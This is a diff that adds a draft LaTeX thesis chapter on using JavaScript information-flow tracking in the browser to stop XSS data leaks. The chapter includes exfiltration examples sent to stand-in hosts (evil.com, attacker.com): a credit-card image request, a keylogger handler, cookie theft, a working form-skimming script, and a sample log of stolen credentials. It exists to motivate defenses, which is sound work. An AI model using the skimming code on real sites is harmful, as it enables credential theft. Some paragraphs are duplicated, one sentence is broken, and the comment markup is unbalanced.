@@ -1,0 +1,268 @@
+\chapter{Defending Against Information Leaks}
+
+
+\begin{comment}
+on using information flow techniques which can detect and prevent malicious behavior of executing programs.
+
+- change language semantics
+- augment memory model with labels
+- detect and intercept xss
+- prevent information leakage
+
+Combine earlier approaches into a universal and comprehensive framework
+- decentralized labeling
+- support more flexible policies
+- hybrid static/dynamic analysis
+- dynamically track information flow
+- pervasively works at the lowest layer
+\end{comment}
+
+
+
+----
+
+Because of these difficulties we propose adding another line of defense that examines and prevents \emph{actions} taken by any injected code to harvest application or user data.
+We propose adopting information flow as an alternative, less brittle, approach for preventing the malicious duplication of data by third-party scripts loaded by the application.
+
+
+Because servers deliver JavaScript as source text, most content and third-party library providers compact their code by automatically shortening variable names, removing all extra whitespace as well as line breaks so the code becomes as small as possible.
+
+----------------------------------------
+
+\subsection{The Nature of Code Injection Attacks}
+\label{sec:jitflow-codeinjection}
+
+Because servers deliver JavaScript as source text, most content and third-party library providers compact their code by automatically shortening variable names, removing all extra whitespace as well as line breaks so the code becomes as small as possible.
+This practice shortens the transfer time for loading JavaScript, but has the side-effect of obfuscating the source code.
+Despite the fact that including this code into a web application grants it access to the application's internals, web authors remain unlikely to audit third-party code for security vulnerabilities, especially when compressed.
+Consequently, dynamic textual inclusion remains an open and prevalent channel through which attackers can inject malicious code into a web application.
+
+This paper distinguishes between two different classes of code-injection:
+
+\begin{itemize}
+
+\item \textit{Non-Persistent (Reflected) attacks}, that occur when the server sends client-provided code embedded in HTTP query parameters and HTML form submissions back to the user as page content after processing by the web application servers.
+
+\item \textit{Persistent attacks}, that occur when the web application stores client-provided data server-side and reflects it back to subsequent visitors.
+
+\end{itemize}
+In both of these cases, from the client's perspective, the origin of the attacker code and the origin of the web application itself, meaning that the Same Origin Policy can not prevent the attack.
+Additional security requires a more powerful, behavior-focused mechanism, such as information flow tracking.
+
+
+\section{Drawbacks of the Same Origin Policy}
+We propose adopting information flow as an alternative, less brittle, approach for preventing the malicious duplication of data by third-party scripts loaded by the application.
+
+
+Previous experience with CrowdFlow~\cite{kerschbaumer.etal+13} shows that, within the Alexa top 500, some pages containing information influenced by code originating from up to six different domains is sent across domain boundaries.
+Verification and proof that the mashup performs only the expected task and does not steal data is not available.
+Hijacking just one commonly included script compromises the privacy of many web users~\cite{nikiforakis.etal+12} and gives the attacker immediate access to their information.
+
+
+\section{The Attacker's Threat}
+\label{sec:threat-model}
+
+Throughout this chapter, we assume that the attacker has already exploited an XSS vulnerability to inject code in the developer's web application, supplying a JavaScript payload via an included advertisement, mashup content, or library, or via an unsanitized form or URL (\autoref{ch:motivation}).
+Although we limit the attack payload to JavaScript, we assume that its origin does not make it distinguishable from the rest of the web application's JavaScript codebase.
+The attacker also has public-facing knowledge about the application, obtained by visiting and interacting with the application and observing its behavior, which can be used to craft the payload.
+We also assume that the attacker controls their own web server that acts as a harvesting point for stolen data.
+
+These aforementioned abilities combine to pose an information leak threat.
+The code injected into the web application executes with the full abilities of that application.
+The attacker crafts the payload to surreptitiously communicate application sensitive information, such as personal login credentials, text the user enters into forms, or anything the web application displays to a visitor to their data-harvesting web server.
+The pilfered information leaves the application as part of a resource request submitted to the attacker controlled server, circumventing the Same Origin Policy.
+
+For a typical example, exfiltration code embeds the sensitive data into a URL and attaches that URL to the \code{src} attribute of a payload generated \code{img} element.
+The web browser automatically issues a GET request for the image targeting the attacker controlled server.
+The attacker then reviews server request logs to harvest the exfiltrated information.
+
+\subsection{The Developer's Response}
+
+Knowing that the origin of attacker code does \emph{not} reliably distinguish it from the rest of the web application, we focus on the malicious \emph{behavior} of any code within the application.
+Indeed, an information leak might be the unintended result of a careless or uninformed application developer, rather than an attacker.
+
+In response to this threat, a security-conscious developer tests their application in a web browser that monitors the flows of information within the application.
+To assist the developer in focusing their debugging attention on specific pieces of sensitive data within the application, \FlowCore\ presents a labeling system as a first-class language construct.
+Without leaving JavaScript, the developer creates a label and applies it to the sensitive data, tagging it with a unique identifier.
+The underlying information flow engine tracks the interaction of application (and injected) code with this sensitive data, ensuring that exfiltration code does not drop the label.
+
+The first-class labeling feature of \FlowCore\ also enables the developer to write a network monitor using JavaScript, so that they may observe a leak of information tagged as sensitive.
+The developer implements their own network monitor logic to inspect the labels of all resource requests, facilitates the detection and debugging of an information leak.
+
+
+%------------------------------------------------------------------------------------------------------
+\subsection{Threat Model}
+\label{sec:jitflow-threatmodel}
+
+As assumed when evaluating \FlowCore\ (\autoref{sec:first-class-evaluation}), I grant the attacker with the ability to inject code into a web application.
+The attacker accomplishes injection by exploiting a XSS vulnerability or the ability to provide content for mashups, advertisements, libraries, etc. which other sites include.
+To collect the stolen data, the attacker controls their own web host.
+The attacker practices only code injection techniques and does not resort to packet sniffing, network interception, or control of the application servers.
+
+%------------------------------------------------------------------------------------------------------
+\subsection{Provided Security}
+\label{sec:jitflow-providedsecurity}
+
+The web browser running \JitFlow\ advanced significantly beyond the capabilities offered when evaluated with only the interpreter \FlowCore.
+The updated browser protects against several information theft attacks, including, but not limited to:
+
+\begin{itemize}[itemsep=4pt,parsep=4pt]
+
+\item \textit{Sensitive Data Theft Attacks:}
+By sending a GET request to a server under the attacker's control, the attacker can steal information in the URL of an image request:
+
+\begin{snippet}
+elem.src = "evil.com/pic.png?" + credit_card_number;
+\end{snippet}
+
+The attacker uses the request for the image as a channel to steal the user's credit card number as a payload in the GET request.
+Merely changing the URL targeted by the \code{src} attribute of an image triggers loading of the image.
+
+\item \textit{Keylogging Attacks:}
+Similarly, to steal a username and password combination, an attacker might craft code that logs keystrokes by registering an event handler:
+
+\begin{snippet}
+document.onkeypress = listenerFunction;
+\end{snippet}
+
+The listener function records the user's keystrokes and sends them to the attacker's server through an HTTP request.
+
+\item \textit{Cookie Stealing Attacks:}
+Furthermore, if a script can access cookies, then an attacker can also steal a session cookie between the browser and an honest site by concatenating the \code{document.cookie} to the URL of the image request.
+The stolen cookie allows the attacker to impersonate the user and hijack the user's session.
+
+\end{itemize}
+
+%------------------------------------------------------------------------------------------------------
+\subsection{Sample Attack: Stealing Form Data}
+\label{sec:jitflow-stealingformdata}
+
+An HTML form provides a page with data entry fields that allow a user to enter text such as a username and password.
+Once a user submits the form, the browser sends the data to the server.
+Virtually all web applications rely on login fields to authenticate their users.
+If an attacker manages to inject code into a web application that contains a login form, the attacker's script can read a user's credentials and send them to an attacker-controlled server.
+Later, the attacker may use the stolen credentials to impersonate users of the web service.
+
+\lstset{
+  label=list:fieldinfo,
+  caption={Example attack code that steals login form data from a web page.}
+}
+\begin{jscode}
+// place hidden image on the page
+var pixel = "<img src=\"http://www.attacker.com/pixel.png\"" +
+            "id=\"pixel\" />";
+document.write(pixel);
+
+function stealFormData(type, value) {
+  var payload = "url=" + document.domain + "&" + type + "=" + value;
+  document.getElementById("pixel").src =
+      "http://www.attacker.com/pixel.png?" + payload;
+}
+
+// add stealFormData to all forms on page
+for (var i = 0; i < document.forms.length; i++) {
+  for (var j = 0; j < document.forms[i].elements.length; j++) {
+    var elem = document.forms[i].elements[j];
+    elem.addEventListener("blur", // triggered when element loses focus
+           function() { stealFormData(this.type, this.value) }, false);
+  }
+}
+\end{jscode}
+
+\autoref{list:fieldinfo} shows exploit code an attacker might use to steal credentials from the login form of a web page.
+The attack script first loads an image (\codeline{2}) supplied by a server under the attacker's control.
+The attacker designs the image to avoid perceptible changes in page layout.
+Few users will notice the placement of a single transparent pixel, but the attacker can use the GET request as a channel to steal confidential page data whenever the image is reloaded from the server.
+
+The attacker knows users will fill out the form and registers (\codelines{14}{15}) a \code{blur}-event handler on all forms elements on the page.
+When a form element loses focus it triggers a call to the \code{blur}-event handler.
+The handler, \code{stealFormData} defined on \codeline{5}, first encodes information about the page domain and contents of the form element which triggered the event in the \code{payload} variable.
+Then it updates the \code{src} attribute of the image with a URL containing the payload.
+This update causes the browser to automatically reload the image, sending the sensitive information in the URL of the image request.
+
+\lstset{
+  label={list:serverlogs},
+  caption={Log of \code{attacker.com} from the running example.}
+}
+\begin{jscode}
+[01/Jan/2014:21:34:10] "GET /pixel.png?url=www.bank.com&text=alice HTTP/1.1"
+[01/Jan/2014:21:34:12] "GET /pixel.png?url=www.bank.com&password=bob69 HTTP/1.1"
+\end{jscode}
+
+By inspecting the server request logs, the attacker can reassemble the captured form data.
+\autoref{list:serverlogs} contains some example entries of image requests.
+The attacker can clearly identify a user of \code{www.bank.com} with login `\code{alice}' having the password `\code{bob69}'.
+
+The webpage \textit{About The Open Web Application Security Project}~\cite{xsscheatsheet} hosts an extensive list of XSS vulnerabilities that provides a detailed description of all the different kinds of XSS attacks.
+
+
+
+
+
+\begin{comment}
+
+To clarify the information flow tracking capabilities of \FlowCore\ and \JitFlow, \autoref{ch:terminology} establishes terminology for the different levels of information flow.
+\autoref{ch:system-design} outlines different implementation strategies and their effects on performance, implementation difficulty, and security label semantics.
+\autoref{ch:label-propagation} describes the underlying data structures that support the label framework.
+As explained in \autoref{ch:instructions}, tracking information dependence through control-flow requires instrumentation of new instructions that manipulate the information flow data structures.
+\autoref{ch:label-tracking} specifies the label propagation strategy used by the framework and illustrates placement of the new instructions through code examples.
+
+To implement unit tests of the label propagation logic, an extension of the browser-hosted JavaScript environment exposes the security labels as first-class program objects (\autoref{ch:first-class-labels}).
+The new instructions provide a versatile architecture that permitted a rapid update of the label propagation system to support JIT compilation (\autoref{ch:jitflow}).
+\autoref{ch:conclusion} summarizes the work involved and lessons learned.
+\end{comment}
+
+
+\section{The Threat of Code Injection}
+
+The most common type of XSS attack, known as a \term{reflected} or \term{non-persistent} vulnerability, arises from using unsanitized data from the web client as input to server-side processing scripts.
+The canonical example involves the user submitting a web search query, encoded in a URL, which the server echoes verbatim as part of the results page.
+If the query contained executable code, the web browser opening up the search page will execute the injected script.
+To become a victim, an innocent user need only to visit a malicious URL, which spammers often obfuscate through a neutral url-shortening service.
+
+The most pernicious type of XSS attack allows the injected script to persist in a server-side data store, between browser sessions.
+The canonical example of a \term{persistent} XSS attack involves a message board or web forum that allows the posting of user-generated content.
+The site stores this content in a server-side database, so that it may be retrieved for viewing by other visitors.
+When a malicious user bypasses textual filters and injects JavaScript into a forum posting, the site saves the script and inserts it into all pages that contain the post.
+To become a victim, an innocent user needs only to view a page with the malicious post.
+
+Many of the victims of XSS have their browser simultaneously logged in to other more sensitive services (such as email, shopping, banking or brokerage accounts).
+For most users, the web browser stores more personally identifying information about individual habits and interests than any other single application.
+Additionally, web browsers also conveniently store login credentials for banking sites, webmail services, and many shopping sites, as well as form information containing your real name, address, phone number, and credit card numbers.
+The potential for harvesting of sensitive user credentials via a forum post or spam email with malicious JavaScript presents a serious threat to the privacy of the average web user.
+
+\section{The Last Line of Defense}
+
+This work assumes that the web application's filter defenses are incomplete and non-exhaustive.
+The attacker is able to bypass the filters and store malicious JavaScript in the web site's database.
+The server code responsible for assembling pages trusts the database content and includes the code in pages viewable by innocent users of the application.
+
+\begin{comment}
+The persistent XSS attack just given illustrates two fundamental principals of web security: (1) user generated content cannot be trusted, and (2) data stored on your own servers should not necessarily be trusted.
+
+The second principal is most concerning, and the one we wish to combat.
+Within the browser, the execution semantics of JavaScript,
+\end{comment}
+
+Persistent XSS attacks have in the past shut down popular Internet services.
+For example, in 2005, the `Samy' worm~\cite{samy} set a world record for viral spreading and forced MySpace to suspend service in order to purge the work from their database.
+In 2007, the RightMedia Trojan propagated itself via malicious banner advertisements delivered through a trusted syndication network.
+These ads appeared on popular sites such as Yahoo! Photobucket and MySpace.
+In the same year, Nduja~\cite{nduja} authored a ``Cross Webmail Worm'' that was able to propagate itself across four webmail providers among the most popular in Italy.
+On each of the four webmail providers separate functionality for both infection and propagation needed to be developed, making this worm the first to spread across different web applications.
+
+Though dated, these anecdotal examples are notable not only for setting records, but also for demonstrating the relative ease with which a clever user can control the actions taken by millions of other browsers.
+Publications tracking security vulnerabilities~\cite{owasp, cwe, whitehat} continually advocate the use of sanitization routines for combating the string inclusion problem, demonstrating that the architectural problems underlying XSS attacks have not been solved.
+
+\subsection{Preventing Malicious Action}
+
+Based on the observation that the execution of code within the JavaScript VM and browser sandbox can cause no harm as long as it does not generate external signals (such as network traffic), we advocate allowing the malicious code to execute under a modified interpreter that tracks the information dependence of runtime values.
+Rather than rely entirely on string filtration that attempts to identify and reject attacker supplied code, this approach tracks the flow of information through a chain of JavaScript program values.
+The web browser categorizes JavaScript code as malicious only when it attempts to communicate sensitive information to an unauthorized third party.
+At that point, a network hook enforcing information flow policies in the browser intervenes and prevents the information leak.
+
+This work describes \FlowCore, an interpreter-level information flow framework written for WebKit's JavaScriptCore virtual machine, and \JitFlow, a JIT-compiled improvement that provides increased performance with respect to the interpreter.
+Both of these systems tag program values and the program counter with labels that convey data ownership by one or more security principals.
+These labels propagate during program execution, and a network monitor implements a security policy by inspecting the label attached data in a network request.
+
+\end{comment}
